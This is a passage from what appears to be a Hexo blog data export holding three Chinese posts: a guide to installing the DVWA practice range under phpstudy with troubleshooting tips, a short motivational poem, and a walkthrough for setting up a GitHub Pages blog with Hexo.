http://127.0.01/DWWA/setup.php\n正常页面：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408120125627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这样直接创建就行了。\n### 4、创建成功\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408120814519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 5、登录靶场\n五选一.......\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408145600310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 6、进入主页面\n下面就是靶场漏洞目录，还有很多功能，我就不一一介绍了。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408145729704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n开始学习吧！！！\n### 7、报错总结\n成功总不是一帆风顺的，踩坑。\n1、如果出现 reCAPTCHA:Missing 字样：\n需要在 configure/configure.inc.php中配置两个量\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408120450316.png)\n\n```\n配置$_DVWA[ 'recaptcha_public_key' ] = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';\n配置$_DVWA[ 'recaptcha_private_key' ] = '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ';\n```\n\n然后刷新页面即可。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408120518902.png)\n2、数据库连接失败，会出现无法连接提示\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020040812060150.png)\n这就是前面为什么使用数据库账号和密码的原因，这样才能连接成功。\n\n\n\n","slug":"搭建DVWA web渗透靶场","published":1,"updated":"2020-05-11T09:28:27.330Z","comments":1,"layout":"post","link":"","_id":"ckchhpshi001l9kq6ga4d891m","content":"<p>﻿## 靶场的搭建是基于phpstudy环境下，phpstudy+DVWA。</p>\n<h3 id=\"1、进入-DVWA-的官网\"><a href=\"#1、进入-DVWA-的官网\" class=\"headerlink\" title=\"1、进入 DVWA 的官网\"></a>1、进入 DVWA 的官网</h3><p>官网 <a href=\"http://www.dvwa.co.uk/\" target=\"_blank\" rel=\"noopener\">http://www.dvwa.co.uk/</a> 页面拉到最下面有下载按钮，也可以从GitHub上clone下来。<img src=\"https://img-blog.csdnimg.cn/20200408113245560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"2、DVWA的安装与配置\"><a href=\"#2、DVWA的安装与配置\" class=\"headerlink\" title=\"2、DVWA的安装与配置\"></a>2、DVWA的安装与配置</h3><p>1、将DVWA解压到phpstudy目录下的www目录下。<br><img src=\"https://img-blog.csdnimg.cn/20200408114405700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>2、修改配置文件<br>先将 //www/DVWA-master/configure/ 中的 configure.inc.php.disc 去掉 .disc 后缀或拷贝一份去掉后缀<br>然后将 configure/configure.inc.php 文件中的数据库信息修改为如下图（也就是配置数据库密码）：<br><img src=\"https://img-blog.csdnimg.cn/2020040811532423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p><strong>用户名，密码是你数据库的。</strong></p>\n<h3 id=\"3、然后浏览器访问-http-127-0-01-DWWA-setup-php\"><a href=\"#3、然后浏览器访问-http-127-0-01-DWWA-setup-php\" class=\"headerlink\" title=\"3、然后浏览器访问 http://127.0.01/DWWA/setup.php\"></a>3、然后浏览器访问 <a href=\"http://127.0.01/DWWA/setup.php\" target=\"_blank\" rel=\"noopener\">http://127.0.01/DWWA/setup.php</a></h3><p>正常页面：<br><img src=\"https://img-blog.csdnimg.cn/20200408120125627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这样直接创建就行了。</p>\n<h3 id=\"4、创建成功\"><a href=\"#4、创建成功\" class=\"headerlink\" title=\"4、创建成功\"></a>4、创建成功</h3><p><img src=\"https://img-blog.csdnimg.cn/20200408120814519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"5、登录靶场\"><a href=\"#5、登录靶场\" class=\"headerlink\" title=\"5、登录靶场\"></a>5、登录靶场</h3><p>五选一…….<br><img src=\"https://img-blog.csdnimg.cn/20200408145600310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"6、进入主页面\"><a href=\"#6、进入主页面\" class=\"headerlink\" title=\"6、进入主页面\"></a>6、进入主页面</h3><p>下面就是靶场漏洞目录，还有很多功能，我就不一一介绍了。<br><img src=\"https://img-blog.csdnimg.cn/20200408145729704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>开始学习吧！！！</p>\n<h3 id=\"7、报错总结\"><a href=\"#7、报错总结\" class=\"headerlink\" title=\"7、报错总结\"></a>7、报错总结</h3><p>成功总不是一帆风顺的，踩坑。<br>1、如果出现 reCAPTCHA:Missing 字样：<br>需要在 configure/configure.inc.php中配置两个量<br><img src=\"https://img-blog.csdnimg.cn/20200408120450316.png\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配置$_DVWA[ &#39;recaptcha_public_key&#39; ] &#x3D; &#39;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#39;;</span><br><span class=\"line\">配置$_DVWA[ &#39;recaptcha_private_key&#39; ] &#x3D; &#39;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#39;;</span><br></pre></td></tr></table></figure>\n\n<p>然后刷新页面即可。<br><img src=\"https://img-blog.csdnimg.cn/20200408120518902.png\" alt=\"在这里插入图片描述\"><br>2、数据库连接失败，会出现无法连接提示<br><img src=\"https://img-blog.csdnimg.cn/2020040812060150.png\" alt=\"在这里插入图片描述\"><br>这就是前面为什么使用数据库账号和密码的原因，这样才能连接成功。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿## 靶场的搭建是基于phpstudy环境下，phpstudy+DVWA。</p>\n<h3 id=\"1、进入-DVWA-的官网\"><a href=\"#1、进入-DVWA-的官网\" class=\"headerlink\" title=\"1、进入 DVWA 的官网\"></a>1、进入 DVWA 的官网</h3><p>官网 <a href=\"http://www.dvwa.co.uk/\" target=\"_blank\" rel=\"noopener\">http://www.dvwa.co.uk/</a> 页面拉到最下面有下载按钮，也可以从GitHub上clone下来。<img src=\"https://img-blog.csdnimg.cn/20200408113245560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"2、DVWA的安装与配置\"><a href=\"#2、DVWA的安装与配置\" class=\"headerlink\" title=\"2、DVWA的安装与配置\"></a>2、DVWA的安装与配置</h3><p>1、将DVWA解压到phpstudy目录下的www目录下。<br><img src=\"https://img-blog.csdnimg.cn/20200408114405700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>2、修改配置文件<br>先将 //www/DVWA-master/configure/ 中的 configure.inc.php.disc 去掉 .disc 后缀或拷贝一份去掉后缀<br>然后将 configure/configure.inc.php 文件中的数据库信息修改为如下图（也就是配置数据库密码）：<br><img src=\"https://img-blog.csdnimg.cn/2020040811532423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p><strong>用户名，密码是你数据库的。</strong></p>\n<h3 id=\"3、然后浏览器访问-http-127-0-01-DWWA-setup-php\"><a href=\"#3、然后浏览器访问-http-127-0-01-DWWA-setup-php\" class=\"headerlink\" title=\"3、然后浏览器访问 http://127.0.01/DWWA/setup.php\"></a>3、然后浏览器访问 <a href=\"http://127.0.01/DWWA/setup.php\" target=\"_blank\" rel=\"noopener\">http://127.0.01/DWWA/setup.php</a></h3><p>正常页面：<br><img src=\"https://img-blog.csdnimg.cn/20200408120125627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这样直接创建就行了。</p>\n<h3 id=\"4、创建成功\"><a href=\"#4、创建成功\" class=\"headerlink\" title=\"4、创建成功\"></a>4、创建成功</h3><p><img src=\"https://img-blog.csdnimg.cn/20200408120814519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"5、登录靶场\"><a href=\"#5、登录靶场\" class=\"headerlink\" title=\"5、登录靶场\"></a>5、登录靶场</h3><p>五选一…….<br><img src=\"https://img-blog.csdnimg.cn/20200408145600310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"6、进入主页面\"><a href=\"#6、进入主页面\" class=\"headerlink\" title=\"6、进入主页面\"></a>6、进入主页面</h3><p>下面就是靶场漏洞目录，还有很多功能，我就不一一介绍了。<br><img src=\"https://img-blog.csdnimg.cn/20200408145729704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>开始学习吧！！！</p>\n<h3 id=\"7、报错总结\"><a href=\"#7、报错总结\" class=\"headerlink\" title=\"7、报错总结\"></a>7、报错总结</h3><p>成功总不是一帆风顺的，踩坑。<br>1、如果出现 reCAPTCHA:Missing 字样：<br>需要在 configure/configure.inc.php中配置两个量<br><img src=\"https://img-blog.csdnimg.cn/20200408120450316.png\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配置$_DVWA[ &#39;recaptcha_public_key&#39; ] &#x3D; &#39;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#39;;</span><br><span class=\"line\">配置$_DVWA[ &#39;recaptcha_private_key&#39; ] &#x3D; &#39;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#39;;</span><br></pre></td></tr></table></figure>\n\n<p>然后刷新页面即可。<br><img src=\"https://img-blog.csdnimg.cn/20200408120518902.png\" alt=\"在这里插入图片描述\"><br>2、数据库连接失败，会出现无法连接提示<br><img src=\"https://img-blog.csdnimg.cn/2020040812060150.png\" alt=\"在这里插入图片描述\"><br>这就是前面为什么使用数据库账号和密码的原因，这样才能连接成功。</p>\n"},{"title":"鸡汤","date":"2020-06-03T09:05:05.000Z","photos":["https://ae01.alicdn.com/kf/H3343d675d24a4340b9c1360c4cf861422.jpg"],"_content":"\n\n\n﻿## 星辰和大海都需要门票，诗和远方的路费也都很贵。 \n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060316583458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n星辰大海需要门票，\n\n诗和远方路费很贵。\n\n就像我们不努力的话，\n\n情怀都养不起。\n\n大海星辰皆不得，\n\n梦想远方不可及。\n\n人生有时候很苦逼，\n\n如果不努力，\n\n你拥有的一切，\n\n都有可能失去；\n\n即使努力了，\n\n也会有很多东西得不到。\n\n世间万物皆有属，\n\n有付出才有可能收获。\n\n世界上所有的美好都是给配得上的人，\n\n所有的东西，都是很贵，\n\n所以，我们有的时候只能努力。\n\n因为所谓的大海星辰，\n\n都是要靠我们自己来得到。\n\n诗和远方都是我们所追求的，\n\n但是，所谓的追求，只不过是我们的努力罢了。\n\n我们总要追求我们的未来，\n\n所以，我们现在一定要努力，\n\n尽力配得上我们的情怀。\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200603165908493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n","source":"_posts/鸡汤  ——致君.md","raw":"---\ntitle: 鸡汤\ndate: 2020-06-03 17:05:05\ntags: 琐事\ncategories: 生活\nphotos: https://ae01.alicdn.com/kf/H3343d675d24a4340b9c1360c4cf861422.jpg\n---\n\n\n\n﻿## 星辰和大海都需要门票，诗和远方的路费也都很贵。 \n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060316583458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n星辰大海需要门票，\n\n诗和远方路费很贵。\n\n就像我们不努力的话，\n\n情怀都养不起。\n\n大海星辰皆不得，\n\n梦想远方不可及。\n\n人生有时候很苦逼，\n\n如果不努力，\n\n你拥有的一切，\n\n都有可能失去；\n\n即使努力了，\n\n也会有很多东西得不到。\n\n世间万物皆有属，\n\n有付出才有可能收获。\n\n世界上所有的美好都是给配得上的人，\n\n所有的东西，都是很贵，\n\n所以，我们有的时候只能努力。\n\n因为所谓的大海星辰，\n\n都是要靠我们自己来得到。\n\n诗和远方都是我们所追求的，\n\n但是，所谓的追求，只不过是我们的努力罢了。\n\n我们总要追求我们的未来，\n\n所以，我们现在一定要努力，\n\n尽力配得上我们的情怀。\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200603165908493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n","slug":"鸡汤  ——致君","published":1,"updated":"2020-06-03T09:12:04.661Z","comments":1,"layout":"post","link":"","_id":"ckchhpshj001p9kq63uc6c2p4","content":"<p>﻿## 星辰和大海都需要门票，诗和远方的路费也都很贵。 </p>\n<p><img src=\"https://img-blog.csdnimg.cn/2020060316583458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>星辰大海需要门票，</p>\n<p>诗和远方路费很贵。</p>\n<p>就像我们不努力的话，</p>\n<p>情怀都养不起。</p>\n<p>大海星辰皆不得，</p>\n<p>梦想远方不可及。</p>\n<p>人生有时候很苦逼，</p>\n<p>如果不努力，</p>\n<p>你拥有的一切，</p>\n<p>都有可能失去；</p>\n<p>即使努力了，</p>\n<p>也会有很多东西得不到。</p>\n<p>世间万物皆有属，</p>\n<p>有付出才有可能收获。</p>\n<p>世界上所有的美好都是给配得上的人，</p>\n<p>所有的东西，都是很贵，</p>\n<p>所以，我们有的时候只能努力。</p>\n<p>因为所谓的大海星辰，</p>\n<p>都是要靠我们自己来得到。</p>\n<p>诗和远方都是我们所追求的，</p>\n<p>但是，所谓的追求，只不过是我们的努力罢了。</p>\n<p>我们总要追求我们的未来，</p>\n<p>所以，我们现在一定要努力，</p>\n<p>尽力配得上我们的情怀。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200603165908493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿## 星辰和大海都需要门票，诗和远方的路费也都很贵。 </p>\n<p><img src=\"https://img-blog.csdnimg.cn/2020060316583458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>星辰大海需要门票，</p>\n<p>诗和远方路费很贵。</p>\n<p>就像我们不努力的话，</p>\n<p>情怀都养不起。</p>\n<p>大海星辰皆不得，</p>\n<p>梦想远方不可及。</p>\n<p>人生有时候很苦逼，</p>\n<p>如果不努力，</p>\n<p>你拥有的一切，</p>\n<p>都有可能失去；</p>\n<p>即使努力了，</p>\n<p>也会有很多东西得不到。</p>\n<p>世间万物皆有属，</p>\n<p>有付出才有可能收获。</p>\n<p>世界上所有的美好都是给配得上的人，</p>\n<p>所有的东西，都是很贵，</p>\n<p>所以，我们有的时候只能努力。</p>\n<p>因为所谓的大海星辰，</p>\n<p>都是要靠我们自己来得到。</p>\n<p>诗和远方都是我们所追求的，</p>\n<p>但是，所谓的追求，只不过是我们的努力罢了。</p>\n<p>我们总要追求我们的未来，</p>\n<p>所以，我们现在一定要努力，</p>\n<p>尽力配得上我们的情怀。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200603165908493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n"},{"_content":"---\ntitle: GitHub博客搭建\ndate: 2020-03-01 15:04:05\ntags: 博客搭建\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp\n\n​---\n\n\n\nGitHub搭建成功有段时间了，期间自己也遇到过很多问题，换过logo，主题，头像，虽然困难很多但总有解决的办法 ，让我骄傲的分享一下搭建的过程！\n\n# 1.安装node!!!\n### 1.在百度搜索Node.js,去官网下载最新稳定版本！下载的过程有点慢，不要着急。\n### 2.下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！!![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211104548998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n# 2.GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）\n# 3.git for Windows的安装！\n###  百度搜索并且安装就完事了!\n# 4.配置GitHub SSH！\n### 1.在你git for windows 的安装路径下的文件夹内找到          git-bash.exe，运行。\n### 2.输入ssh-keygen -t  rsa      -C \"自己的邮箱\"，会生成一段密钥，及密钥所在路径。在.ssh中id-rsa的文件内用记事本打开，复制下来。\n### 3.登录你的GitHub，进入设置，找到SSH keys。把刚刚复制的密钥粘贴下来，就行了。\n# 5.hexo的安装及使用。\n###  1.在D盘内创建一个新文件夹(我的是blog)，以便于后边的hexo的本地安装。\n###  2.打开cmd命令行，cd blog回车,然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm install -g cnpm --registry=https://registry.npm.taobao.org，这个会提高下载速度。\n### 3.按照官网的使用命令教程一步步进行。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211114359163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 4.安装好后本地运行，local host：5555，就可以看到自己的博客了。（是不是很激动）\n# 6.安装sublime text。\n### 1.安装后直接打开，并将自己的博客目录拖进sublime text。\n### 2.自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。\n###  *注意：sublime text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。*![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211115507522.png)\n# 7.hexo发布前的准备。\n### 1.去hexo官网安装插件，否则会报错哟。安装成功的标志。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211120921962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 2.config.yml中的url更改为自己的博客站点，还有作者的名字。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211120941355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 3.最后面的配置也不能忘！*注意：（repo：自己的GitHub博客仓库地址）*![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211121457874.png)\n### 4.然后先hexo g生成，再hexo d再提交，并配置博客信息。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211121852741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 5.输入成功后会让你登录GitHub的博客。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020021112224291.png)\n\n# 自此博客创建成功了！！！开心呀。\n","source":"_posts/搭建GitHub博客的过程及一些问题！！！.md","raw":"---\ntitle: GitHub博客搭建\ndate: 2020-03-01 15:04:05\ntags: 博客搭建\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp\n\n​---\n\n\n\nGitHub搭建成功有段时间了，期间自己也遇到过很多问题，换过logo，主题，头像，虽然困难很多但总有解决的办法 ，让我骄傲的分享一下搭建的过程！\n\n# 1.安装node!!!\n### 1.在百度搜索Node.js,去官网下载最新稳定版本！下载的过程有点慢，不要着急。\n### 2.下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！!![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211104548998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n# 2.GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）\n# 3.git for Windows的安装！\n###  百度搜索并且安装就完事了!\n# 4.配置GitHub SSH！\n### 1.在你git for windows 的安装路径下的文件夹内找到          git-bash.exe，运行。\n### 2.输入ssh-keygen -t  rsa      -C \"自己的邮箱\"，会生成一段密钥，及密钥所在路径。在.ssh中id-rsa的文件内用记事本打开，复制下来。\n### 3.登录你的GitHub，进入设置，找到SSH keys。把刚刚复制的密钥粘贴下来，就行了。\n# 5.hexo的安装及使用。\n###  1.在D盘内创建一个新文件夹(我的是blog)，以便于后边的hexo的本地安装。\n###  2.打开cmd命令行，cd blog回车,然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm install -g cnpm --registry=https://registry.npm.taobao.org，这个会提高下载速度。\n### 3.按照官网的使用命令教程一步步进行。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211114359163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 4.安装好后本地运行，local host：5555，就可以看到自己的博客了。（是不是很激动）\n# 6.安装sublime text。\n### 1.安装后直接打开，并将自己的博客目录拖进sublime text。\n### 2.自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。\n###  *注意：sublime text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。*![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211115507522.png)\n# 7.hexo发布前的准备。\n### 1.去hexo官网安装插件，否则会报错哟。安装成功的标志。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211120921962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 2.config.yml中的url更改为自己的博客站点，还有作者的名字。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211120941355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 3.最后面的配置也不能忘！*注意：（repo：自己的GitHub博客仓库地址）*![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211121457874.png)\n### 4.然后先hexo g生成，再hexo d再提交，并配置博客信息。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211121852741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 5.输入成功后会让你登录GitHub的博客。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020021112224291.png)\n\n# 自此博客创建成功了！！！开心呀。\n","slug":"搭建GitHub博客的过程及一些问题！！！","published":1,"date":"2020-02-11T04:44:28.940Z","updated":"2020-05-21T13:33:52.903Z","title":"搭建GitHub博客的过程及一些问题！！！","comments":1,"layout":"post","photos":[],"link":"","_id":"ckchhpshq00289kq6aoefggng","content":"<hr>\n<p>title: GitHub博客搭建<br>date: 2020-03-01 15:04:05<br>tags: 博客搭建<br>categories: 技术<br>photos: <a href=\"https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp\" target=\"_blank\" rel=\"noopener\">https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp</a></p>\n<p>​—</p>\n<p>GitHub搭建成功有段时间了，期间自己也遇到过很多问题，换过logo，主题，头像，虽然困难很多但总有解决的办法 ，让我骄傲的分享一下搭建的过程！</p>\n<h1 id=\"1-安装node\"><a href=\"#1-安装node\" class=\"headerlink\" title=\"1.安装node!!!\"></a>1.安装node!!!</h1><h3 id=\"1-在百度搜索Node-js-去官网下载最新稳定版本！下载的过程有点慢，不要着急。\"><a href=\"#1-在百度搜索Node-js-去官网下载最新稳定版本！下载的过程有点慢，不要着急。\" class=\"headerlink\" title=\"1.在百度搜索Node.js,去官网下载最新稳定版本！下载的过程有点慢，不要着急。\"></a>1.在百度搜索Node.js,去官网下载最新稳定版本！下载的过程有点慢，不要着急。</h3><h3 id=\"2-下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！\"><a 